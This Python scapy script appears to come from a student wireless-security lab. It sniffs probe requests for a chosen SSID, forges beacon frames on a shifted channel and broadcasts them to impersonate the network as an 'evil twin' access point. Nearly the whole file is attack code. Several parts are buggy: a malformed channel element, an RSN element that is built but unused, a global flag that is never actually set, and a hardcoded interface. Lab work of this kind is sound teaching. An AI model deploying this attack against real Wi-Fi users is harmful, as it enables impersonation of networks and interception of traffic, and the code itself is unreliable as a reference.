#  -*- coding: utf-8 -*-

# SWI - Labo2-MAC2
# Date: 09.03.2020
# File: station-detection.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# Sources: - IEEE Std 802.11-2016
#          - https://gist.github.com/securitytube/5291959
#		   - https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/

from scapy.all import *
import os
import subprocess

# We check if the user provided the required numbers of arguments
if len(sys.argv) != 3:
    print("usage : station-detection.py <interface> <target ssid>")
    exit()

interface = sys.argv[1]
ssid = sys.argv[2].encode()

target = []

# Handle captured packet
# pkt: captured packet
def PacketHandler(pkt):
	if pkt.haslayer(Dot11):
		# We check if it is a probe frame
		if pkt.type==0 and pkt.subtype==4:
			print("AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info))
			if bytes(ssid) == pkt.info:
				target.append(pkt)
				found = True
				
				print("SSID found!\nAP MAC: %s with SSID: %s " %(target[0].addr2, target[0].info))
				evilTwin(target[0], ssid, "wlan0mon")

# Forge a beacon
# pkt: probe request containing information needed for the beacon
# ch: channel on which the beacon will be advertise
# Return the forged beacon
def beaconCrafting(pkt, ch):
	try:
		dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=pkt.addr2, addr3=pkt.addr1)
		beacon = Dot11Beacon(cap='ESS+privacy')
		essid = Dot11Elt(ID=pkt.info,info=pkt.info, len=len(pkt.info))
		channel = Dot11Elt(ID=pkt.info, info=chr(ch))
		rsn = Dot11Elt(ID='RSNinfo', info=(
		'\x01\x00'
		'\x00\x0f\xac\x02'
		'\x02\x00'
		'\x00\x0f\xac\x04'
		'\x00\x0f\xac\x02'
		'\x01\x00'
		'\x00\x0f\xac\x02'
		'\x00\x00'))

		frame =  RadioTap()/dot11/beacon/channel
		return frame

	except Exception as ex:
		print("In BeaconCrafting: ")
		print(ex)
		exit()

# Create an evil twin of the ssid provided
# pkt: probe request for the target ssid
# ssid: target ssid
def evilTwin(pkt, ssid, interface):

		# We retrieve the end of the packet
		payload = pkt.getlayer(6)

		# We retrieve the target channel
		target_channel = pkt[RadioTap].Channel
		print("Target channel: " + str(target_channel % 14))

		# We define a new channel for the beacons
		if(target_channel > 7):
			new_ch = (target_channel - 6) % 14
		else:
			new_ch = (target_channel + 6) % 14

		print("New Channel " + str(new_ch))

		os.system(f"iwconfig {interface} channel {new_ch}")

		frame = beaconCrafting(pkt, new_ch)

		#dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=pkt.addr2, addr3=pkt.addr2)
		#beacon = Dot11Beacon(cap='ESS+privacy')
		#essid = Dot11Elt(ID=pkt.info,info=pkt.info, len=len(pkt.info))
		#channel = Dot11Elt(ID="DSset", info=chr(new_ch))
		#rsn = Dot11Elt(ID='RSNinfo', info=(
		#'\x01\x00'
		#'\x00\x0f\xac\x02'
		#'\x02\x00'
		#'\x00\x0f\xac\x04'
		#'\x00\x0f\xac\x02'
		#'\x01\x00'
		#'\x00\x0f\xac\x02'
		#'\x00\x00'))
#
		#frame =  RadioTap()/dot11/beacon/essid/rsn

		input("\nPress enter to send\n")

		sendp(frame, count=100, iface=interface, inter=0.1, loop=1)
		exit()
    
	

found = False
wait_msg = "Scanning"

print(wait_msg)
sniff(iface=interface, prn = PacketHandler, store=0, timeout=2)

# The sniffing will repeat as long as the target is not found
while found == False:
	print("Do you want to continue scanning ?[Y/n]")
	if input() == "n":
		exit()

	print(wait_msg)
	
	sniff(iface=interface, prn = PacketHandler, store=0, timeout=5)
	if found == True:
		break

print("Launching evil twin")
# evilTwin(target[0], ssid, interface)
